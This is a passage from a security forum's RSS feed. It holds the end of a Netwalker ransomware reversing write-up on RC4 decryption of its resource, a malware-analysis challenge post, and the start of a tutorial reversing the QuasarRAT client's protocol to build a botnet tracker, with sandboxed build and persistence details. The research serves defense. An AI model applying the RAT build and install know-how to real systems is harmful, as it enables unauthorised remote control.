<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3852faf7dae9a6ac314899af4179ef5881916ae8.png" alt="" data-base62-sha1="82gwq4RHZlKVXwqNy44H4jsIgli" width="384" height="302"></p>
<p>The malware then loads the key length and the key itself and saves it to a stack variable</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/30c1bcaac60dcdd0d7255f95c35386cf892f245a.png" alt="" data-base62-sha1="6XjZSSKWDuTx2cch87uIVlJ50Bs" width="398" height="96"></p>
<p>Copied key:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3a035d591053dee59325599bf4d251917b8a8f06.png" alt="" data-base62-sha1="8hcTVgytYNzVigFucsborh6uTNY" width="169" height="19"></p>
<p>Afterwards the key value, size and a pointer to the heap buffer containing the resource are saved and pushed into a function I renamed <strong>func_RC4Decrypt</strong>:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/280f07ee77566a3dab1e8d25d8bac1c5684328fe.png" alt="" data-base62-sha1="5IniKZYQwkf9JJ9XvyMqsvhlHEq" width="267" height="340"></p>
<p>Vitaly assumes this within the blog:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6332dcfa09971e964b33f26ded9e1c3c2d78d306.png" alt="" data-base62-sha1="e9yf5QCNWY1d9XseQ77A8iboqVw" width="624" height="240"></p>
<p>If one followed the lesson in the course carefully one knows that one of the recognizable features of <strong>RC4 KSA</strong> is a loop flow iterating <strong>256</strong> times:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d27f98d6576ba60a8f813ae77aa1d18c48ada564.png" alt="" data-base62-sha1="u29DW70G6eodJ039S53bQKXdDrS" width="548" height="173"></p>
<p>and if we examine the function located at <strong>0x10009210</strong> we can confirm an example for this at <strong>0x10009281</strong> and at <strong>0x100092CF</strong>:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/46d6c1d322476e9771b6ef284bd7c439b9a9257b.png" alt="" data-base62-sha1="a6FxlTXwFXWiH3kJjqVrE6SvlVN" width="287" height="253"></p>
<p><strong>EBP</strong> is being loaded with <strong>256</strong> as a preparation of the second <strong>KSA</strong> iteration:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f95bd6b54b1ab918bf05c8dec1464c9b1d756147.png" alt="" data-base62-sha1="zzVEwEPAsXQ4u0qKgPuQTxHKqNx" width="263" height="46"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7a1bad5d17e2a77f5525f91c5cfc2c97086382dd.png" alt="" data-base62-sha1="hqdy4nrkmmPreYVYcemzeqf15JX" width="262" height="210"></p>
<hr>
<h3>Decryption process as seen within the debugger:</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4e1f5d983afd6f8d2ff2b697b53348d7d4168633.png" alt="" data-base62-sha1="b96rtD2gGvbGXpcT9OBo6caSjsL" width="624" height="47"></p>
<p>Size(red), key(blue), resource(rest)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/effd23db01b1f0131a4e17976ea9fef1c2b5b8ce.png" alt="" data-base62-sha1="yf2sRrqwog55xhcmPyP4HGdVowC" width="594" height="165"></p>
<p>After the function decryption is finished:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0c0e51cc4189649ec9c940a98358382d63a94cdd.png" alt="" data-base62-sha1="1IEpmvEm2Nturn759nR5H4V6kyN" width="596" height="165"></p>
<p>Finally, at location <strong>0x10003832</strong> the sample restores the Netwalker header back to <strong>0xDEAD</strong>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a53b446a09ab2e2248ef63d0099b954c5e3ef5f3.png" alt="" data-base62-sha1="nzHLfxlpC9BXT8jrrHk7AxGo9TZ" width="329" height="143"></p>
<p>I wonder if <strong>0xDEAD</strong> is a cross binary constant across all Netwalker samples <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>Sources:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="/uploads/default/original/2X/2/2cd17a874defe1c35c781d668d0a02cad5a9bf72.jpeg" class="site-icon" width="32" height="32">
      <a href="https://zero2auto.com/2020/05/19/netwalker-re/" target="_blank" rel="noopener nofollow ugc" title="01:03AM - 19 May 2020">Zero2Automated Blog – 19 May 20</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/02e82ec3e37d65de457b2d72511faac0322820ab.png" class="thumbnail" width="" height="">

<h3><a href="https://zero2auto.com/2020/05/19/netwalker-re/" target="_blank" rel="noopener nofollow ugc">Netwalker Ransomware – From Static Reverse Engineering to Automatic Extraction</a></h3>

<p>Author: Zero2Automated Course Team (preview from courses.zero2auto.com) Netwalker ransomware has been around since at least 2019* and has recently been in the news from a TrendMicro report detailin…</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d9521d1e8cb48525a863bcf9ccc65fd70769036d.png" class="site-icon" width="" height="">
      <a href="https://www.trendmicro.com/en_us/research/20/e/netwalker-fileless-ransomware-injected-via-reflective-loading.html" target="_blank" rel="noopener nofollow ugc">Trend Micro</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:641/350;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/7/677046b257f90fcae993ac62541ac9da84c382d6.jpeg" class="thumbnail" width="641" height="350"></div>

<h3><a href="https://www.trendmicro.com/en_us/research/20/e/netwalker-fileless-ransomware-injected-via-reflective-loading.html" target="_blank" rel="noopener nofollow ugc">Reflective Loading Runs Netwalker Fileless Ransomware</a></h3>

<p>Ransomware in itself poses a formidable threat for organizations. As a fileless threat, the risk is increased as it can more effectively evade detection. We discuss how Netwalker ransomware is deployed filelessly through reflective DLL injection.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><a href="https://any.run/report/f4656a9af30e98ed2103194f798fa00fd1686618e3e62fba6b15c9959135b7be/ca44ad38-0e46-455e-8cfd-42fb53d41a1d" class="onebox" target="_blank" rel="noopener nofollow ugc">https://any.run/report/f4656a9af30e98ed2103194f798fa00fd1686618e3e62fba6b15c9959135b7be/ca44ad38-0e46-455e-8cfd-42fb53d41a1d</a></p>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://d.clarkee.co.uk/t/quickie-zero2auto-malware-course-homework/21616">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/quickie-zero2auto-malware-course-homework/21616</link>
          <pubDate>Fri, 05 Jun 2020 11:49:36 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-21616</guid>
          <source url="https://d.clarkee.co.uk/t/quickie-zero2auto-malware-course-homework/21616.rss">[Quickie] Zero2Auto Malware Course Homework</source>
        </item>
        <item>
          <title>[Malware Challenges] AnalyzeMe No1</title>
          <dc:creator><![CDATA[Danus]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h2><strong>Background</strong></h2>
<p>Hello agent <strong>0x00</strong>, welcome to the malware analysis training grounds. You are now being trained to become part of the most sophisticated malware analysis teams in the NSA.<br>
To fully prepare you for the battlefield, we have created this small course for you to complete.</p>
<p>We have extracted this low grade sample from a cyber crime gang operating in Sudan.<br>
We would like you to take a look at this sample and extract any meaningful artifacts from it.</p>
<p>File: <a href="https://github.com/DanusMinimus/Malware-challanges">https://github.com/DanusMinimus/Malware-challanges</a></p>
<p>Good Luck.<br>
<img src="https://upload.wikimedia.org/wikipedia/commons/8/8d/Seal_of_the_U.S._National_Security_Agency.svg" alt="img" width="500" height="500"></p>
<hr>
<h2>Technical Assignment</h2>
<p>Attached below is a malware sample that I’ve created, please run it in an appropriate Virtual Machine.<br>
You must do the following tasks and please be verbose as possible:</p>
<p><strong>Extract any host based indicators</strong></p>
<ol>
<li>Does the sample drop any files on disk? If yes where?</li>
<li>If a file is dropped, what is the contents of it?</li>
</ol>
<p><strong>Anti RE</strong></p>
<ol>
<li>How does the sample manage to “waste” debugging time? (Use a debugger for this one)</li>
</ol>
<p><strong>Extract any network based indicators</strong></p>
<ol>
<li>Does this sample connect to any website? if it does what is the host name of that website?</li>
</ol>
<h3>Tools</h3>
<p>You can use any tools in your arsenal.</p>
            <p><small>8 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/malware-challenges-analyzeme-no1/20894">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/malware-challenges-analyzeme-no1/20894</link>
          <pubDate>Wed, 29 Apr 2020 19:39:30 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-20894</guid>
          <source url="https://d.clarkee.co.uk/t/malware-challenges-analyzeme-no1/20894.rss">[Malware Challenges] AnalyzeMe No1</source>
        </item>
        <item>
          <title>Master of RATs - How to create your own Tracker</title>
          <dc:creator><![CDATA[Danus]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1><strong>Master of RATs</strong></h1>
<hr>
<h1><strong>Preface</strong></h1>
<p>One day I was skimming through <a href="https://urlhaus.abuse.ch/browse/" rel="noopener nofollow ugc">abuse.ch</a>. This website collects user submitted malicious or suspicious URLs and I've stumbled through something very interesting. I saw that a user that goes by the twitter handle <a href="https://twitter.com/Gandylyan1" rel="noopener nofollow ugc">@Gandylyan1</a> is uploading huge amounts of daily samples of the same malware variant called <strong>Mozi</strong> (<a href="https://blog.netlab.360.com/mozi-another-botnet-using-dht/" rel="noopener nofollow ugc">You can read about it here</a>). This botnet is an IoT P2P botnet that seems to spread like crazy. Gandy is uploading samples as I write this article and there are currently 24,709 IPs uploaded to abuse.ch, and it seems gandy is the only one uploading them.</p>
<p>The malware is very interesting and not too complicated too understand. In the basic gist it spreads through IoT devices using known exploits and brute forcing attacks, if it manages to connect to an IoT device it starts an http service on that device and uploads itself to a random port and hosts the sample on the IoT device's IP address. This peer scans and attacks the network and when it takes over another device this newly infected device will receive the mozi sample from the previously infected peer. This is a parasite. I was so excited about this that I've decided to set off with a simple goal in mind – to build a tracker for this botnet.</p>
<p>But alas my Linux knowledge can be summed up with the fact that I know that " <strong>ls -la</strong>" should print the contents of a directory. But the idea of creating a malware tracking tool was eating me up day and night. After a short search I've stumbled upon the following tool created by <a href="https://intezer.com/?utm_campaign=Brand%20ads&amp;utm_source=Google%20Ads&amp;utm_content=Brand&amp;utm_term=%2Bintezer&amp;utm_campaign=0719+RLSA&amp;utm_source=adwords&amp;utm_medium=ppc&amp;hsa_acc=6013738437&amp;hsa_cam=9281250457&amp;hsa_grp=94310168375&amp;hsa_ad=417088374601&amp;hsa_src=g&amp;hsa_tgt=aud-877982745810:kwd-765886859489&amp;hsa_kw=%2Bintezer&amp;hsa_mt=b&amp;hsa_net=adwords&amp;hsa_ver=3&amp;gclid=CjwKCAjwv4_1BRAhEiwAtMDLsu6-ldJnan200Cnv305zpq8XjqohXDXEJnVf-i9srcKGV46nfLgwJBoC5ioQAvD_BwE" rel="noopener nofollow ugc">Intezer</a>. This tool is found here <a href="https://github.com/intezer/MoP" rel="noopener nofollow ugc">https://github.com/intezer/MoP</a>. This tool is a small python project allows a researcher to fake an infected malware client by simulating an OS environment. All the researcher must do is reverse a malware network protocol. No honeypots, no virtual machines no nothing. Sounds easy right? I though the same. I looked up any open source malware tools on GitHub and found <a href="https://github.com/quasar/QuasarRAT" rel="noopener nofollow ugc">Quasar</a>, which is an open source RAT which is used by people for malicious purposes. This is a great way to learn about malware, reversing open source malware and just understanding how everything works under the hood on the networking side. Great candidate for our little experiment! And so, I have set of to become the Master of RATs.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cca4990878eea30c64f815ebf46b6e76d3125295.jpeg" alt="" data-base62-sha1="tcm3i7nNHghfhOVwBljFWHopOHb" width="624" height="351"></p>
<p><strong>Required Knowledge:</strong></p>
<ol>
<li>Basic knowledge of Wireshark</li>
<li>Basic knowledge of programming</li>
<li>Intermediate knowledge in python</li>
<li>Basic knowledge in C#</li>
</ol>
<p><strong>Required Tools:</strong></p>
<ol>
<li>VMWare</li>
<li>Visual Studio Community</li>
<li>Python 3.8</li>
<li>Sublime Text Editor 3</li>
<li>Dnspy</li>
<li>De4dot</li>
<li>Brain</li>
</ol>
<p><strong>Setting up some goals:</strong></p>
<p>Before we even think about using Intezers tool we must reverse Quasar. What are we looking for?</p>
<ol>
<li>We want to understand how a Quasar client connects to a server</li>
<li>We want to understand how Quasar constructs the messages it sends to the sever</li>
<li>We want to understand if there is an encryption/decryption process for processing messages</li>
<li>We also want to understand how the server processes client messages (which is possible in this case since we hold the source code for Quasar)</li>
</ol>
<hr>
<h2><strong>Learning to read C#</strong></h2>
<p>We load up the downloaded Quasar source into Visual Studio 2019 Community which can be downloaded for free <a href="https://visualstudio.microsoft.com/vs/community/" rel="noopener nofollow ugc">here</a> and we are greeted with this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/31543236fe2db805211d3955fa32062265481a64.png" alt="" data-base62-sha1="72nMHmFef3pkIxS7No5Pa3DWsE4" width="306" height="181"></p>
<p>We are interested in the client code, how ever just for reference and as we will be dealing with the others – Common contains various utilities and Server contains the code for the Server application. All C# programs start with <strong>Program.cs</strong> as far as I managed to figure out so we will start there as well, let's open <strong>Quasar.Client</strong> and find <strong>Program.CS</strong>.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f8ee801e84ee698ef4cabbccaa624cc47c3de82b.png" data-download-href="/uploads/short-url/zw9oEegwDzjqpHeTTLoiYhOX9AD.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f8ee801e84ee698ef4cabbccaa624cc47c3de82b.png" alt="" data-base62-sha1="zw9oEegwDzjqpHeTTLoiYhOX9AD" width="624" height="431" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f8ee801e84ee698ef4cabbccaa624cc47c3de82b_2_10x10.png"></a></div><p></p>
<p>Ah, I wish this was C <img src="https://0x00sec.org/images/emoji/twitter/frowning.png?v=9" title=":frowning:" class="emoji" alt=":frowning:">. Anyway, we can see a few things of interest in this little statement if we right click <strong>QuasarClient</strong> and then click on go to implementation we will drop on where most of the juice happens in this code.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/90af3044a3e23a57d466bc157388d9217fabc459.png" data-download-href="/uploads/short-url/kDW5V0GzWwVvE1CvC8KfyWAo78d.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/90af3044a3e23a57d466bc157388d9217fabc459.png" alt="" data-base62-sha1="kDW5V0GzWwVvE1CvC8KfyWAo78d" width="624" height="163" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/90af3044a3e23a57d466bc157388d9217fabc459_2_10x10.png"></a></div><p></p>
<p>We'll start by explaining the <strong>QuasarClient</strong> class which inherits from the <strong>Client</strong> Class. The job of this class is to manage all the events that that accrue within the client, It has a special function to handle the registration of the bot ( <strong>OnClientState</strong> ), it has a function to handle message reading events ( <strong>OnClientRead</strong> ) and failing events ( <strong>OnClientFail</strong> ).</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f3746ac535c562e80818b056fdc45a9195fcd627.png" data-download-href="/uploads/short-url/yJHrL88QKVz899LDC1O4ZZTNeTl.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f3746ac535c562e80818b056fdc45a9195fcd627.png" alt="" data-base62-sha1="yJHrL88QKVz899LDC1O4ZZTNeTl" width="608" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f3746ac535c562e80818b056fdc45a9195fcd627_2_10x10.png"></a></div><p></p>
<p>The <strong>OnClientState</strong> function attempts to send an identification packet to the server. To explore how this message is created we can access the constructor of the <strong>ClientIdentification</strong> Class</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/b/bd4776f0e96f7ce2a9484f33bcdeb3067362e22f.png" data-download-href="/uploads/short-url/r0rlXkeTkZx5DyFesQuwFydVm7t.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bd4776f0e96f7ce2a9484f33bcdeb3067362e22f.png" alt="" data-base62-sha1="r0rlXkeTkZx5DyFesQuwFydVm7t" width="318" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bd4776f0e96f7ce2a9484f33bcdeb3067362e22f_2_10x10.png"></a></div><p></p>
<p>Everything here seems rather normal except for these Proto declarations.</p>
<p>Let's get back to the <strong>Program</strong>. <strong>cs</strong> code block and look at <strong>ConnectClient.Connect</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cc0a646e0e710705a98ecc391d29ddb0394668e4.png" alt="" data-base62-sha1="t71Fv6dHLniKD2X7Uw7jsd2eN2k" width="511" height="347"></p>
<p>Which leads us back to the base <strong>Client</strong> class</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/d/df454af21f34919ff06c4a3bcacfa72396126ef0.png" data-download-href="/uploads/short-url/vR8VXYvaMeSxaXJ7kVHs0HQgv4s.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/df454af21f34919ff06c4a3bcacfa72396126ef0.png" alt="" data-base62-sha1="vR8VXYvaMeSxaXJ7kVHs0HQgv4s" width="624" height="303" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/df454af21f34919ff06c4a3bcacfa72396126ef0_2_10x10.png"></a></div><p></p>
<p>Alright! Seems like this the answer to our first goal! It seems that to initiate a connection the client first establishes an SSL Stream, and then it looks like some sort of validation is happening using <strong>ValidateServerCertificate</strong> callback and <strong>AuthnticateAsClient</strong>. Let's leave these for now as we are just mapping how the code works. Now what happens next? If we access <strong>OnClientState</strong> through the <strong>Client</strong> base class that would lead us to the event handler itself, to find the actual function that triggers on this even we must go to <strong>QuasarClient.cs</strong> and access the reimplementation of the function through there (Gosh I hate OOP). As we saw before, The <strong>OnClientState</strong> function triggers the <strong>client.Send</strong> function</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ee3f3db47c72def354da276a4684e38c43dd3639.png" alt="" data-base62-sha1="xZD88yVZBoqabO8CRVj5m8q3whj" width="580" height="489"></p>
<p>I'll be honest I don't know C# but I'm working with my instincts here (much like in assembly haha) and the only thing of value that I see here is <strong>ProcessSendBuffers</strong> so let's access that and see if it would yield us any results.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/4/4b7b7e21f93a40ef130b0c20fbbade4043aaf617.png" data-download-href="/uploads/short-url/aLKojyRsAKkHIpo6j2IdLtTmnqf.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4b7b7e21f93a40ef130b0c20fbbade4043aaf617.png" alt="" data-base62-sha1="aLKojyRsAKkHIpo6j2IdLtTmnqf" width="423" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4b7b7e21f93a40ef130b0c20fbbade4043aaf617_2_10x10.png"></a></div><p></p>
<p>Again, using the same strategy as before, lets access <strong>SafeSendMessage</strong> and see where it takes us.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/68fb03fbb33a059abb4ffe0618745178fb56056c.png" alt="" data-base62-sha1="eYHse6xBGxdAPS7Jn7Izr653vhq" width="624" height="412"></p>
<p>Alright, now we don't want to access <strong>OnClientWrite</strong> as I fear it won't take us where we want but instead lets access <strong>WriteMessage</strong> which is located within the class called <strong>PayloadWriter</strong>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dd68734c72d072e02d327ba06636d525627f2604.png" alt="" data-base62-sha1="vAFiTZfmNQ7JKADhS6Pkr7OqPBi" width="624" height="349"></p>
<p>Jackpot. This function writes a serialized message(I'll explain what serialization is, don't worry) to the SSL stream! So, let's make a small diagram detailing our findings:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/d/dfa60054b38657c1a6822fa07136c9985507f6d7.png" data-download-href="/uploads/short-url/vUu8byzs72dFqYtMc7rqkZtfJL9.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dfa60054b38657c1a6822fa07136c9985507f6d7.png" alt="" data-base62-sha1="vUu8byzs72dFqYtMc7rqkZtfJL9" width="209" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dfa60054b38657c1a6822fa07136c9985507f6d7_2_10x10.png"></a></div><p></p>
<p>Alright, this is obviously very shallow and incomplete and as we progress with our dynamic analysis, we could expand on this diagram so let's compile this Quasar Project on Release settings in Visual Studio and move this entire thing to a virtual machine and start playing around with it.</p>
<hr>
<h3><strong>Building and analyzing a sample:</strong></h3>
<p>After you compile Quasar and moved it to an isolated environment you can start the Quasar.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/8/824d52d1825301954652ab6d63961d7052469e67.png" data-download-href="/uploads/short-url/iAHJDexkyY8xB5OBNAWs8CXhJu7.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/824d52d1825301954652ab6d63961d7052469e67.png" alt="" data-base62-sha1="iAHJDexkyY8xB5OBNAWs8CXhJu7" width="624" height="422" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/824d52d1825301954652ab6d63961d7052469e67_2_10x10.png"></a></div><p></p>
<p>This screen should pop up, and this is actually very important. This pop message is a builder for the <strong>X509</strong> Certificate which is responsible for creating a valid SSL stream between the client and the server. Quasar will generate a <strong>X509</strong> cert and bind this cert to all generated clients. You can learn more about SSL here: <a href="https://www.youtube.com/watch?v=iQsKdtjwtYI" rel="noopener nofollow ugc">https://www.youtube.com/watch?v=iQsKdtjwtYI</a></p>
<p>After you generate a certificate is time to build a sample, after generating the certification click on the <strong>Builder</strong> and you should be promoted with the builder menu, the most important part is this one:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/4/4cc4db33aab3174c47dfd566c0f736feb56193db.png" data-download-href="/uploads/short-url/aX837voLm1ZrZzYGyuJgYOJej1N.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4cc4db33aab3174c47dfd566c0f736feb56193db.png" alt="" data-base62-sha1="aX837voLm1ZrZzYGyuJgYOJej1N" width="597" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4cc4db33aab3174c47dfd566c0f736feb56193db_2_10x10.png"></a></div><p></p>
<p>I have 2 IPs here; one is the loop back address and the other is the local IP of this Virtual Machine. I would suggest binding the client to the IP of the current virtual machine as it would be possible to emulate connections to the server from the current virtual machine and outside through the host (since the host is also a member within the VMWare local network). You can use any port you like but I've used port <strong>27015</strong> because Minecraft. After you built the client you should see it within the current directory of the installed Quasar client. Let's take it out and open it in <strong>dnspy</strong> which is a <strong>.NET decompiler</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/369be6576082d5cb7d9fed32e0d5efc0c1755947.png" alt="" data-base62-sha1="7N5Nq8EityScbZyuG2YaCamqKQD" width="624" height="242"></p>
<p>But we are met with this garbage, but do not worry! We can use <strong>de4dot</strong> which a .NET binary de-obfuscator so let's run it and we should be met with a clean Quasar client:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/3/3bcd80d3667589874ab183557eac4b63ce9948cb.png" data-download-href="/uploads/short-url/8x2stSMxH2wzohLfkVH8eZW68Xh.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3bcd80d3667589874ab183557eac4b63ce9948cb.png" alt="" data-base62-sha1="8x2stSMxH2wzohLfkVH8eZW68Xh" width="624" height="292" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3bcd80d3667589874ab183557eac4b63ce9948cb_2_10x10.png"></a></div><p></p>
<p>So what you can see here, is although our Quasar client is clean the symbols are gone but don't worry as we hold the full source so let's start debugging. we just want to see if our diagram is correct so lets click start and place a break point on the entry point (I highly suggest renaming these functions and class names according to the source but since I've debugged this so many times I already know this know block like my right hand). PLEASE MAKE SURE QUASAR SERVER IS RUNNING. We'll encounter our first problem with in <strong>Class0.smethod_3()</strong> which is the second Initialization method:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4e44f309ccdf66459329ebbbbab98c9a9ce05a0d.png" alt="" data-base62-sha1="baoXTrg7gC64BWwRDUERJk9v8cJ" width="340" height="121"></p>
<p>It will not return <strong>True</strong> , thus causing the client not to execute and exit. but why?! Let's look inside our source code:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/2cb07cfb810952510714db8364ba86f89cfcbb91.png" data-download-href="/uploads/short-url/6nl8f43vQuayHXzahgu55IIPX0Z.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2cb07cfb810952510714db8364ba86f89cfcbb91.png" alt="" data-base62-sha1="6nl8f43vQuayHXzahgu55IIPX0Z" width="624" height="131" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2cb07cfb810952510714db8364ba86f89cfcbb91_2_10x10.png"></a></div><p></p>
<p>This if statement which is marked in red, install and connects our client to the server by returning <strong>true</strong> after initializing but it seems it will not execute as the <strong>current path</strong> the client is running from is not equal to the <strong>install path</strong>. To understand what I mean let's go back to the builder:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/3/3df6279a4ccb5445d3735c1e307d373b1a87b77d.png" data-download-href="/uploads/short-url/8Q8vBjcKYk5ArY6TBYt3RvLZw8B.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3df6279a4ccb5445d3735c1e307d373b1a87b77d.png" alt="" data-base62-sha1="8Q8vBjcKYk5ArY6TBYt3RvLZw8B" width="604" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3df6279a4ccb5445d3735c1e307d373b1a87b77d_2_10x10.png"></a></div><p></p>
<p>So, this code block checks if the client is currently being run from inside <strong>Appdata\Romaing</strong> (In this specific case) if its not there it would execute the following code:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e378aa9e3c20101500527f1c022a9d64657b0990.png" alt="" data-base62-sha1="wsiUzKCHBwA4jLOYohCsbjX15Ty" width="478" height="125"></p>
<p>This code handles two problems, one is that the client has detected that another instance of Quasar is running because it detected the same <strong>mutex</strong> that was used within the current client and the other is to Install the client into the computer but adding persistence, killing and deleting the current file and process and relaunching it after it has been moved to our designated install folder. You can enter the <strong>Install</strong> method and read for yourself as the code is very documented. This is very cool cause it gives a researcher a real insight in how malware might be developed. With this knowledge in mind let's do two things:</p>
<ol>
<li>Update our diagram</li>
<li>Move our client to the designated install directory and start it from there</li>
</ol>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1bcca32e135cb773a613e7a9b1ec617b02857348.png" alt="" data-base62-sha1="3XVkaFwdRid2ALILp2TvfNjtiiY" width="489" height="500"></p>
<p>Let's debug our client from our preferred install directory and see what happens, remember to make sure the quasar server is running in addition I would like to fire up Wireshark to monitor the network(This are my own settings, and the IP address and Port will be different on your machine):</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/07b9c6e11f2fe95b71d87b35811df000a346f6d3.png" alt="" data-base62-sha1="16lmMjn67WQpy2AqRwYvidQWGCD" width="621" height="23"></p>
<p>I'll restart the client from the <strong>Appdata\Roaming</strong> directory and jump straight into the <strong>Client.Connect</strong> function:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1c0307c9524697e07401bf2fceb86e45bb6045d6.png" alt="" data-base62-sha1="3ZNRqN1ADcqWLalJkZ9ryRARZc2" width="624" height="46"></p>
<p>This time we hit exactly where we want <strong>(Pro tip, you can right click dnspy objects and change their names but hitting Edit method, after hitting enter to confirm the change it would send you inside the edited function – to go back, press backspace).</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/94dad03cfe4fe0dae89ef35c2a50881b631b86f3.png" alt="" data-base62-sha1="lePtdrAAXMvpEYM7dH9KGWM5JWr" width="624" height="97"></p>
<p>We have three places that are of value here, first is the <strong>RemoteCertificationValidationCallBack</strong> which would validate the certification received from the server, the stream reading function and <strong>OnClientState</strong> function that as stated before should send us to the <strong>QuasarClient</strong> registration handler.</p>
